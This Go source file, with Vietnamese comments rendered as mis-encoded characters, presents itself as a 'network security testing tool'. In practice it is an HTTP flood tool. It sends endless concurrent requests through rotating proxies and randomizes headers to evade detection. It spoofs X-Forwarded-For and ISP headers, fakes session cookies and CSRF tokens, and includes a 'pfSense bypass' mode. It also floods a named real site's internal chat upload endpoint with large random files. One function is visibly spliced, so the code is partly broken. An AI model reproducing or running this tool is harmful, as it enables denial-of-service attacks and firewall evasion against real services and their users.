		"Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
		"Mozilla/5.0 (iPad; CPU OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
		"Mozilla/5.0 (Linux; Android 11; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
	}

	// Referers ph·ªï bi·∫øn cho Vi·ªát Nam
	referers = []string{
		"https://www.google.com.vn/",
		"https://www.facebook.com/",
		"https://www.youtube.com/",
		"https://vnexpress.net/",
		"https://dantri.com.vn/",
		"https://kenh14.vn/",
		"https://tuoitre.vn/",
		"https://thanhnien.vn/",
		"https://shopee.vn/",
		"https://tiki.vn/",
		"https://vtv.vn/",
		"",
	}

	// Accept-Language headers
	acceptLanguages = []string{
		"vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
		"vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7",
		"en-US,en;q=0.9,vi;q=0.8",
		"vi;q=0.8,en-US;q=0.5,en;q=0.3",
		"vi-VN,vi;q=0.9",
	}

	// Connection headers
	connections = []string{
		"keep-alive",
		"close",
	}

	// Cache-Control headers
	cacheControls = []string{
		"max-age=0",
		"no-cache",
		"no-store",
		"must-revalidate",
	}

	// Accept-Encoding headers
	acceptEncodings = []string{
		"gzip, deflate",
		"gzip, deflate, br",
		"gzip",
		"br",
		"*",
	}

	// M·∫£ng ch·ª©a danh s√°ch ISP Vi·ªát Nam
	vietnamISPs := []string{
		"Viettel Group",
		"VNPT Corp",
		"FPT Telecom",
		"CMC Telecom",
		"NetNam",
		"Mobifone",
		"SCTV",
		"Vinaphone",
		"SPT",
	}

	var attempt int
	success := false

	// V√≤ng l·∫∑p th·ª≠ l·∫°i khi l·ªói
	for attempt = 0; attempt < config.MaxRetries && !success; attempt++ {
		// N·∫øu kh√¥ng ph·∫£i l√† l·∫ßn th·ª≠ ƒë·∫ßu ti√™n, ch·ªù m·ªôt kho·∫£ng th·ªùi gian tr∆∞·ªõc khi th·ª≠ l·∫°i
		if attempt > 0 {
			var delay time.Duration
			if config.RandomTiming {
				// Th√™m jitter ng·∫´u nhi√™n v√†o delay
				jitter := rand.Intn(config.TimingJitterMs*2) - config.TimingJitterMs
				delay = time.Duration(config.DelayMs+jitter) * time.Millisecond
			} else {
				delay = time.Duration(config.DelayMs) * time.Millisecond
			}

			fmt.Printf("Client %d: ƒê·ª£i %v tr∆∞·ªõc khi th·ª≠ l·∫°i l·∫ßn %d\n", clientID, delay, attempt+1)
			time.Sleep(delay)
		}

		// T·∫°o request
		req, err := http.NewRequest("GET", urlStr, nil)
		if err != nil {
			fmt.Printf("L·ªói t·∫°o request t·ª´ client %d: %v\n", clientID, err)
			continue
		}

		// Th√™m c√°c header ng·∫´u nhi√™n
		userAgent := userAgents[rand.Intn(len(userAgents))]
		referer := referers[rand.Intn(len(referers))]
		acceptLanguage := acceptLanguages[rand.Intn(len(acceptLanguages))]
		connection := connections[rand.Intn(len(connections))]
		cacheControl := cacheControls[rand.Intn(len(cacheControls))]
		acceptEncoding := acceptEncodings[rand.Intn(len(acceptEncodings))]

		req.Header.Set("User-Agent", userAgent)
		if referer != "" {
			req.Header.Set("Referer", referer)
		}
		req.Header.Set("Accept-Language", acceptLanguage)
		req.Header.Set("Connection", connection)
		req.Header.Set("Cache-Control", cacheControl)
		req.Header.Set("Accept-Encoding", acceptEncoding)
		req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")

		// N·∫øu ƒëang s·ª≠ d·ª•ng pfSenseBypass, th√™m c√°c header ƒë·∫∑c bi·ªát
		if config.PfSenseBypass {
			// Gi·∫£ m·∫°o header cho ISP Vi·ªát Nam
			vietnamISP := vietnamISPs[rand.Intn(len(vietnamISPs))]
			req.Header.Set("X-Forwarded-For", fmt.Sprintf("1%d.%d.%d.%d", rand.Intn(10), rand.Intn(256), rand.Intn(256), 1+rand.Intn(254)))
			req.Header.Set("X-ISP", vietnamISP)

			// T·∫°o cookie gi·∫£ ng·∫´u nhi√™n
			cookieValue := fmt.Sprintf("PHPSESSID=%s; path=/; domain=.%s; HttpOnly",
				generateRandomString(26),
				config.TargetServer)
			req.Header.Set("Cookie", cookieValue)

			// Th√™m header ng·∫´u nhi√™n v·ªõi t·∫ßn su·∫•t ng·∫´u nhi√™n
			if rand.Float64() < 0.7 {
				req.Header.Set("X-Requested-With", "XMLHttpRequest")
			}

			if rand.Float64() < 0.5 {
				req.Header.Set("DNT", "1")
			}

			// Th√™m c√°c header ƒë·∫∑c bi·ªát ƒë·ªÉ bypass pfSense
			req.Header.Set("Pragma", "no-cache")
		}

		// N·∫øu ƒë√£ th·ª≠ nhi·ªÅu l·∫ßn kh√¥ng th√†nh c√¥ng, th·ª≠ ƒë·ªïi protocol
		if attempt >= 5 && config.Protocol == "https" {
			urlStr = fmt.Sprintf("http://%s:%s%s", config.TargetServer, config.TargetPort, endpoint)
			req, err = http.NewRequest("GET", urlStr, nil)
			if err != nil {
				fmt.Printf("L·ªói t·∫°o HTTP request t·ª´ client %d: %v\n", clientID, err)
				continue
			}
			fmt.Printf("Client %d th·ª≠ v·ªõi HTTP thay v√¨ HTTPS (l·∫ßn %d): %s\n", clientID, attempt+1, urlStr)
		}

		// B·∫Øt ƒë·∫ßu ƒëo th·ªùi gian
		startTime := time.Now()

		// G·ª≠i request
		resp, err := client.Do(req)
		if err != nil {
			// Chuy·ªÉn proxy v√†o blacklist t·∫°m th·ªùi n·∫øu c√≥ l·ªói v√† ƒëang s·ª≠ d·ª•ng proxy
			if usingProxy && proxy.IP != "" {
				blacklistTime := time.Duration(config.ProxyBlacklistTimeMin) * time.Minute
				fmt.Printf("‚ö†Ô∏è Proxy %s:%s b·ªã t·∫°m kh√≥a trong %v do qu√° nhi·ªÅu l·ªói\n",
					proxy.IP, proxy.Port, blacklistTime)
				proxyPool.disableProxy(proxy, blacklistTime)
				fmt.Printf("‚ö†Ô∏è Proxy %s:%s ƒë√£ b·ªã ƒë∆∞a v√†o blacklist t·∫°m th·ªùi\n", proxy.IP, proxy.Port)
			}

			fmt.Printf("L·ªói khi g·ª≠i GET t·ª´ client %d: %v\n", clientID, err)
			continue
		}

		// ƒê·ªçc v√† ƒë√≥ng response body
		_, err = io.Copy(io.Discard, resp.Body)
		resp.Body.Close()
		if err != nil {
			fmt.Printf("L·ªói khi ƒë·ªçc response body t·ª´ client %d: %v\n", clientID, err)
			continue
		}

		// T√≠nh th·ªùi gian ƒë√£ tr√¥i qua
		elapsed := time.Since(startTime)
		atomic.AddInt64(&stats.totalResponseTime, elapsed.Milliseconds())

		// Ki·ªÉm tra c√≥ b·ªã ch·∫∑n kh√¥ng
		if config.PfSenseBypass {
			bodyLower := strings.ToLower(string("")) // Kh√¥ng c·∫ßn n·ªôi dung th·ª±c t·∫ø v√¨ kh√¥ng s·ª≠ d·ª•ng

			// Ki·ªÉm tra c√°c d·∫°ng ch·∫∑n kh√°c nhau
			blockTerms := []string{
				"access denied", "geo", "location", "block", "restricted",
				"not available", "unavailable", "forbidden", "banned",
				"country", "region", "unauthorized", "firewalled",
				"vpn detected", "proxy detected", "cloudflare",
			}

			isBlocked := false
			for _, term := range blockTerms {
				if strings.Contains(bodyLower, term) {
					isBlocked = true
					fmt.Printf("‚ùå Client %d b·ªã ch·∫∑n: Ph√°t hi·ªán '%s' trong response\n", clientID, term)
					break
				}
			}

			// N·∫øu status code l√† 403, 429 ho·∫∑c chu·ªói b·ªã ch·∫∑n ƒë∆∞·ª£c t√¨m th·∫•y
			if resp.StatusCode == 403 || resp.StatusCode == 429 || isBlocked {
				atomic.AddInt64(&stats.blockedRequests, 1)
				fmt.Printf("‚ùå Client %d b·ªã ch·∫∑n: Status code %d\n", clientID, resp.StatusCode)

				// ƒê√°nh d·∫•u proxy n√†y c√≥ v·∫•n ƒë·ªÅ n·∫øu ƒëang s·ª≠ d·ª•ng proxy
				if usingProxy && proxy.IP != "" {
					blacklistTime := time.Duration(config.ProxyBlacklistTimeMin) * time.Minute
					proxyPool.disableProxy(proxy, blacklistTime)
					fmt.Printf("‚ö†Ô∏è Proxy %s:%s ƒë√£ b·ªã ƒë∆∞a v√†o blacklist do b·ªã ch·∫∑n\n", proxy.IP, proxy.Port)
				}
				continue
			}
		}

		// Th√†nh c√¥ng!
		fmt.Printf("Client %d (GET) nh·∫≠n ph·∫£n h·ªìi: %s\n", clientID, resp.Status)

		// TƒÉng s·ªë l∆∞·ª£ng request th√†nh c√¥ng
		atomic.AddInt64(&stats.successfulRequests, 1)
		if usingProxy {
			atomic.AddInt64(&stats.proxyRequests, 1)
		} else {
			atomic.AddInt64(&stats.directRequests, 1)
		}

		success = true
	}

	if !success {
		fmt.Printf("‚ö†Ô∏è Client %d ƒë√£ h·∫øt s·ªë l·∫ßn th·ª≠, kh√¥ng th·ªÉ k·∫øt n·ªëi\n", clientID)
		atomic.AddInt64(&stats.failedRequests, 1)
	}
}

// V√¥ hi·ªáu h√≥a proxy trong m·ªôt kho·∫£ng th·ªùi gian
	// T√≠nh th·ªùi gian ƒë√£ tr√¥i qua
	elapsed := time.Since(startTime)
	elapsedSeconds := float64(elapsed) / float64(time.Second)

	// T√≠nh to√°n t·ªëc ƒë·ªô
	requestsPerSecond := float64(stats.totalRequests) / elapsedSeconds
	successPerSecond := float64(stats.successfulRequests) / elapsedSeconds

	// T√≠nh t·ª∑ l·ªá th√†nh c√¥ng
	var successRate float64 = 0
	if stats.totalRequests > 0 {
		successRate = float64(stats.successfulRequests) / float64(stats.totalRequests) * 100
	}

	// T√≠nh th·ªùi gian ph·∫£n h·ªìi trung b√¨nh
	var avgResponseTime float64 = 0
	if stats.successfulRequests > 0 {
		avgResponseTime = float64(stats.totalResponseTime) / float64(stats.successfulRequests)
	}

	// T√≠nh s·ªë l∆∞·ª£ng proxy kh·∫£ d·ª•ng v√† ƒëi·ªÉm trung b√¨nh
	availableProxies := 0
	totalProxies := 0
	totalScore := 0.0

	if proxyPool != nil {
		proxyPool.mutex.Lock()
		for _, p := range proxyPool.proxies {
			totalProxies++
			if !p.disabled {
				availableProxies++
				totalScore += p.score
			}
		}
		proxyPool.mutex.Unlock()
	}

	var avgScore float64 = 0
	if availableProxies > 0 {
		avgScore = totalScore / float64(availableProxies)
	}

	// In th√¥ng tin th·ªëng k√™
	fmt.Printf("\nüìä === ADVANCED NETWORK SECURITY TESTING TOOL V4.0 === üìä\n")
	fmt.Printf("‚è±Ô∏è  Th·ªùi gian: %s | T·ªëc ƒë·ªô: %.1f req/s (%.1f success/s)\n",
		formatDuration(elapsed), requestsPerSecond, successPerSecond)
	fmt.Printf("üìä T·ªïng requests: %d | Th√†nh c√¥ng: %d (%.1f%%)\n",
		stats.totalRequests, stats.successfulRequests, successRate)
	fmt.Printf("‚ùå L·ªói: %d | Timeout: %d | Blocked: %d\n",
		stats.failedRequests, stats.timeoutRequests, stats.blockedRequests)
	fmt.Printf("üîó Proxy: %d | Direct: %d\n",
		stats.proxyRequests, stats.directRequests)
	fmt.Printf("‚ö° Th·ªùi gian ph·∫£n h·ªìi TB: %.1fms\n", avgResponseTime)
	fmt.Printf("üåê Proxy Pool: %d/%d kh·∫£ d·ª•ng (avg score: %.2f)\n",
		availableProxies, totalProxies, avgScore)
	fmt.Printf("üíæ Goroutines: %d\n", stats.activeGoroutines)
	fmt.Println("======================================================")
}

// H√†m ƒë·ªãnh d·∫°ng th·ªùi gian
func formatDuration(d time.Duration) string {
	d = d.Round(time.Second)
	h := d / time.Hour
	d -= h * time.Hour
	m := d / time.Minute
	d -= m * time.Minute
	s := d / time.Second

	if h > 0 {
		return fmt.Sprintf("%dh%dm%ds", h, m, s)
	}
	return fmt.Sprintf("%dm%ds", m, s)
}

// H√†m g·ª≠i file upload request
func sendFileUploadRequest(endpoint string, clientID int, stats *Stats, wg *sync.WaitGroup, proxyPool *ProxyPool, config *Config) {
	defer wg.Done()

	// ƒê√°nh d·∫•u ƒë√£ g·ªçi h√†m n√†y
	atomic.AddInt64(&stats.totalRequests, 1)
	atomic.AddInt32(&stats.activeGoroutines, 1)
	defer atomic.AddInt32(&stats.activeGoroutines, -1)

	// Quy·∫øt ƒë·ªãnh gi·ªØa proxy v√† k·∫øt n·ªëi tr·ª±c ti·∫øp d·ª±a tr√™n t·ª∑ l·ªá c·∫•u h√¨nh
	var client *http.Client
	var proxy Proxy
	var usingProxy bool
	var proxySuccess bool

	// Quy·∫øt ƒë·ªãnh s·ª≠ d·ª•ng proxy hay k·∫øt n·ªëi tr·ª±c ti·∫øp
	if proxyPool != nil && len(proxyPool.proxies) > 0 && rand.Float64() > config.UseDirectRatio {
		proxy, proxySuccess = proxyPool.getAvailableProxyWithCountryPreference(config.PreferredCountries)
		if proxySuccess {
			var err error
			client, err = createProxyClient(proxy)
			if err != nil {
				fmt.Printf("L·ªói t·∫°o proxy client: %v - Chuy·ªÉn sang k·∫øt n·ªëi tr·ª±c ti·∫øp\n", err)
				client = createHttpClient(config)
			} else {
				usingProxy = true
				fmt.Printf("Client %d ƒëang s·ª≠ d·ª•ng proxy: %s:%s (File Upload)\n", clientID, proxy.IP, proxy.Port)
			}
		} else {
			client = createHttpClient(config)
			fmt.Printf("Client %d ƒëang s·ª≠ d·ª•ng k·∫øt n·ªëi tr·ª±c ti·∫øp (IP th·∫≠t) (File Upload)\n", clientID)
		}
	} else {
		client = createHttpClient(config)
		fmt.Printf("Client %d ƒëang s·ª≠ d·ª•ng k·∫øt n·ªëi tr·ª±c ti·∫øp (IP th·∫≠t) (File Upload)\n", clientID)
	}

	// TƒÉng timeout cho client ƒë·ªÉ x·ª≠ l√Ω file l·ªõn
	client.Timeout = time.Duration(config.TimeoutMs*2) * time.Millisecond

	// T·∫°o URL d·ª±a tr√™n protocol
	urlStr := fmt.Sprintf("%s://%s:%s%s", config.Protocol, config.TargetServer, config.TargetPort, endpoint)

	var attempt int
	success := false

	// V√≤ng l·∫∑p th·ª≠ l·∫°i khi l·ªói
	for attempt = 0; attempt < config.MaxRetries && !success; attempt++ {
		// N·∫øu kh√¥ng ph·∫£i l√† l·∫ßn th·ª≠ ƒë·∫ßu ti√™n, ch·ªù m·ªôt kho·∫£ng th·ªùi gian tr∆∞·ªõc khi th·ª≠ l·∫°i
		if attempt > 0 {
			var delay time.Duration
			if config.RandomTiming {
				// Th√™m jitter ng·∫´u nhi√™n v√†o delay
				jitter := rand.Intn(config.TimingJitterMs*2) - config.TimingJitterMs
				delay = time.Duration(config.DelayMs+jitter) * time.Millisecond
			} else {
				delay = time.Duration(config.DelayMs) * time.Millisecond
			}

			fmt.Printf("Client %d: ƒê·ª£i %v tr∆∞·ªõc khi th·ª≠ l·∫°i l·∫ßn %d (File Upload)\n", clientID, delay, attempt+1)
			time.Sleep(delay)
		}

		// T·∫°o multipart form data v·ªõi buffer l·ªõn h∆°n
		var b bytes.Buffer
		w := multipart.NewWriter(&b)

		// T·∫°o d·ªØ li·ªáu gi·∫£ cho file - s·ª≠ d·ª•ng c√°ch ti·∫øt ki·ªám b·ªô nh·ªõ
		fileSize := config.FileUploadSizeMB * 1024 * 1024 // Convert MB to bytes
		chunkSize := 1024 * 1024                          // 1MB chunks

		// T·∫°o file part
		fw, err := w.CreateFormFile("file", fmt.Sprintf("test_file_%d.dat", clientID))
		if err != nil {
			fmt.Printf("L·ªói t·∫°o form file t·ª´ client %d: %v\n", clientID, err)
			continue
		}

		// Ghi d·ªØ li·ªáu theo t·ª´ng chunk ƒë·ªÉ ti·∫øt ki·ªám b·ªô nh·ªõ
		chunk := make([]byte, chunkSize)
		bytesWritten := 0

		for bytesWritten < fileSize {
			// T·∫°o d·ªØ li·ªáu ng·∫´u nhi√™n cho chunk
			rand.Read(chunk)

			// T√≠nh to√°n k√≠ch th∆∞·ªõc c·∫ßn ghi
			writeSize := chunkSize
			if bytesWritten+writeSize > fileSize {
				writeSize = fileSize - bytesWritten
			}

			// Ghi chunk
			if _, err = fw.Write(chunk[:writeSize]); err != nil {
				fmt.Printf("L·ªói ghi d·ªØ li·ªáu file t·ª´ client %d: %v\n", clientID, err)
				break
			}

			bytesWritten += writeSize
		}

		if err != nil {
			continue
		}

		// Th√™m c√°c tr∆∞·ªùng form kh√°c
		if fw, err = w.CreateFormField("chat_id"); err != nil {
			fmt.Printf("L·ªói t·∫°o tr∆∞·ªùng chat_id t·ª´ client %d: %v\n", clientID, err)
			continue
		}
		if _, err = fw.Write([]byte(fmt.Sprintf("%d", 1000+rand.Intn(9000)))); err != nil {
			fmt.Printf("L·ªói ghi d·ªØ li·ªáu chat_id t·ª´ client %d: %v\n", clientID, err)
			continue
		}

		// ƒê√≥ng multipart writer
		w.Close()

		// T·∫°o request
		req, err := http.NewRequest("POST", urlStr, &b)
		if err != nil {
			fmt.Printf("L·ªói t·∫°o POST request t·ª´ client %d: %v\n", clientID, err)
			continue
		}

		// Th√™m c√°c header c·∫ßn thi·∫øt
		req.Header.Set("Content-Type", w.FormDataContentType())
		req.Header.Set("User-Agent", "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Mobile Safari/537.36")
		req.Header.Set("Accept", "application/json, text/javascript, */*; q=0.01")
		req.Header.Set("Accept-Language", "en-US,en;q=0.9,vi;q=0.8")
		req.Header.Set("Accept-Encoding", "gzip, deflate, br, zstd")
		req.Header.Set("Origin", "https://support.trianh.vn")
		req.Header.Set("Referer", "https://support.trianh.vn/internal-chat/index")
		req.Header.Set("sec-ch-ua", "\"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"138\", \"Google Chrome\";v=\"138\"")
		req.Header.Set("sec-ch-ua-mobile", "?1")
		req.Header.Set("sec-ch-ua-platform", "\"Android\"")
		req.Header.Set("sec-fetch-dest", "empty")
		req.Header.Set("sec-fetch-mode", "cors")
		req.Header.Set("sec-fetch-site", "same-origin")
		req.Header.Set("x-requested-with", "XMLHttpRequest")

		// T·∫°o CSRF token ng·∫´u nhi√™n
		csrfToken := generateRandomString(64)
		req.Header.Set("x-csrf-token", csrfToken)

		// T·∫°o cookie
		cookieValue := fmt.Sprintf("_ga=GA1.1.%d.%d; _ga_BGKJH6NJEZ=GS2.1.%d.%d.%d; PHPSESSID=%s; _csrf=%s; language=%s; _ga_CLEY0P5671=GS2.1.%d.%d.%d",
			100000000+rand.Intn(900000000),
			time.Now().Unix()-int64(rand.Intn(10000000)),
			time.Now().Unix()-int64(rand.Intn(1000000)),
			time.Now().Unix()-int64(rand.Intn(1000000)),
			time.Now().Unix()-int64(rand.Intn(1000000)),
			generateRandomString(26),
			generateRandomHexString(96),
			generateRandomHexString(96),
			time.Now().Unix()-int64(rand.Intn(1000000)),
			time.Now().Unix()-int64(rand.Intn(1000000)),
			time.Now().Unix()-int64(rand.Intn(1000000)))
		req.Header.Set("Cookie", cookieValue)

		// B·∫Øt ƒë·∫ßu ƒëo th·ªùi gian
		startTime := time.Now()

		// G·ª≠i request
		resp, err := client.Do(req)
		if err != nil {
			// Chuy·ªÉn proxy v√†o blacklist t·∫°m th·ªùi n·∫øu c√≥ l·ªói v√† ƒëang s·ª≠ d·ª•ng proxy
			if usingProxy && proxy.IP != "" {
				blacklistTime := time.Duration(config.ProxyBlacklistTimeMin) * time.Minute
				fmt.Printf("‚ö†Ô∏è Proxy %s:%s b·ªã t·∫°m kh√≥a trong %v do qu√° nhi·ªÅu l·ªói (File Upload)\n",
					proxy.IP, proxy.Port, blacklistTime)
				proxyPool.disableProxy(proxy, blacklistTime)
				fmt.Printf("‚ö†Ô∏è Proxy %s:%s ƒë√£ b·ªã ƒë∆∞a v√†o blacklist t·∫°m th·ªùi\n", proxy.IP, proxy.Port)
			}

			fmt.Printf("L·ªói khi g·ª≠i POST t·ª´ client %d: %v\n", clientID, err)
			continue
		}

		// ƒê·ªçc v√† ƒë√≥ng response body
		body, err := io.ReadAll(resp.Body)
		resp.Body.Close()
		if err != nil {
			fmt.Printf("L·ªói khi ƒë·ªçc response body t·ª´ client %d: %v\n", clientID, err)
			continue
		}

		// T√≠nh th·ªùi gian ƒë√£ tr√¥i qua
		elapsed := time.Since(startTime)
		atomic.AddInt64(&stats.totalResponseTime, elapsed.Milliseconds())

		// Ki·ªÉm tra ph·∫£n h·ªìi
		fmt.Printf("Client %d (POST) nh·∫≠n ph·∫£n h·ªìi: %s, K√≠ch th∆∞·ªõc file: %dMB, Th·ªùi gian: %v\n",
			clientID, resp.Status, config.FileUploadSizeMB, elapsed)

		if resp.StatusCode == 200 {
			fmt.Printf("‚úÖ Client %d upload file th√†nh c√¥ng: %s\n", clientID, string(body))

			// TƒÉng s·ªë l∆∞·ª£ng request th√†nh c√¥ng
			atomic.AddInt64(&stats.successfulRequests, 1)
			if usingProxy {
				atomic.AddInt64(&stats.proxyRequests, 1)
			} else {
				atomic.AddInt64(&stats.directRequests, 1)
			}

			success = true
		} else {
			fmt.Printf("‚ùå Client %d upload file th·∫•t b·∫°i: %s - %s\n", clientID, resp.Status, string(body))
		}
	}

	if !success {
		fmt.Printf("‚ö†Ô∏è Client %d ƒë√£ h·∫øt s·ªë l·∫ßn th·ª≠, kh√¥ng th·ªÉ upload file\n", clientID)
		atomic.AddInt64(&stats.failedRequests, 1)
	}
}

// T·∫°o chu·ªói ng·∫´u nhi√™n c√≥ ƒë·ªô d√†i x√°c ƒë·ªãnh
func generateRandomString(length int) string {
	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, length)
	for i := range b {
		b[i] = charset[rand.Intn(len(charset))]
	}
	return string(b)
}

// T·∫°o chu·ªói hex ng·∫´u nhi√™n
func generateRandomHexString(length int) string {
	const charset = "0123456789abcdef"
	b := make([]byte, length)
	for i := range b {
		b[i] = charset[rand.Intn(len(charset))]
	}
	return string(b)
}

// H√†m ch√≠nh ƒë·ªÉ ch·∫°y c√°c request
func main() {
	// Kh·ªüi t·∫°o random seed
	rand.Seed(time.Now().UnixNano())

	// ƒê·ªçc c·∫•u h√¨nh t·ª´ file
	config, err := loadConfig("config.txt")
	if err != nil {
		fmt.Printf("L·ªói khi ƒë·ªçc c·∫•u h√¨nh: %v\n", err)
	}

	// ƒê·ªçc danh s√°ch proxy t·ª´ file
	proxyPool, err := loadProxies("proxies.txt")
	if err != nil {
		fmt.Printf("L·ªói khi ƒë·ªçc proxy: %v\n", err)
		fmt.Println("Ti·∫øp t·ª•c v·ªõi k·∫øt n·ªëi tr·ª±c ti·∫øp...")
	}

	// Kh·ªüi t·∫°o th·ªëng k√™
	var stats Stats

	// Th·ªùi ƒëi·ªÉm b·∫Øt ƒë·∫ßu
	startTime := time.Now()
	lastStatTime := time.Now()

	// Kh·ªüi t·∫°o goroutines ƒë·ªÉ g·ª≠i request
	var wg sync.WaitGroup
	clientID := 0

	for {
		// Ki·ªÉm tra n·∫øu ƒë√£ ƒë·∫°t ƒë·∫øn s·ªë l∆∞·ª£ng goroutine t·ªëi ƒëa
		if int(stats.activeGoroutines) >= config.MaxConcurrent {
			time.Sleep(10 * time.Millisecond)
			continue
		}

		// TƒÉng ID client
		clientID++

		// Ch·ªçn endpoint ng·∫´u nhi√™n
		endpoint := config.Endpoints[rand.Intn(len(config.Endpoints))]

		// Quy·∫øt ƒë·ªãnh xem c√≥ s·ª≠ d·ª•ng upload file hay kh√¥ng
		useFileUpload := config.EnableFileUpload &&
			endpoint == "/internal-chat/send-file" &&
			rand.Float64() < config.FileUploadRatio

		wg.Add(1)

		if useFileUpload {
			go sendFileUploadRequest(endpoint, clientID, &stats, &wg, proxyPool, config)
		} else {
			go sendHTTPRequest(endpoint, clientID, &stats, &wg, proxyPool, config)
		}

		// Th√™m delay nh·ªè gi·ªØa c√°c l·∫ßn kh·ªüi t·∫°o goroutine
		time.Sleep(time.Duration(config.DelayMs) * time.Millisecond)

		// In th·ªëng k√™ sau m·ªói 5 gi√¢y
		if time.Since(lastStatTime) > 5*time.Second {
			printStats(&stats, startTime, proxyPool, config)
			lastStatTime = time.Now()
		}
	}
}
